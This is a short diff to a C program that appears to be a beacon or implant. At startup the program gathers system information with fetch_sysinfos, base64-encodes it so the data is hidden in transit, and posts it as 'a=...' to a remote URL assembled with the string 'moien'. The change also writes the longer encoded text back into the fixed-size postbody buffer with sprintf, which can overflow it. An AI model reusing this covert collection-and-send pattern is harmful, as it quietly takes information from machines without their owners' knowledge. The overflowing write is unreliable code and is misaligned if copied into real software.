@@ -111,6 +111,8 @@ int main(int argc, char *argv[])
     char rbuf[BSIZE];
     char wbuf[BSIZE];
     char postbody[BSIZE];
+    unsigned char *enbody;
+    size_t enlen;
 
     // if ((cmd = strrchr(argv[0], '/')) == NULL)
     //     cmd = argv[0];
@@ -155,7 +157,10 @@ int main(int argc, char *argv[])
         strcat(wbuf, "moien");
         printf("%s\n", wbuf);
         fetch_sysinfos(postbody);
-        // strcpy(postbody, "os=linux&ip=1.1.1.1");
+        // y23_buf(postbody, strlen(postbody));
+        enbody = base64_encode((unsigned char *)postbody, strlen(postbody), &enlen);
+        sprintf(postbody, "a=%s", enbody);
+        free(enbody);
         http_postb(wbuf, postbody, strlen(postbody), rbuf);
         // http_post(wbuf, "os=linux", rbuf);
         printf("%s\n", rbuf);
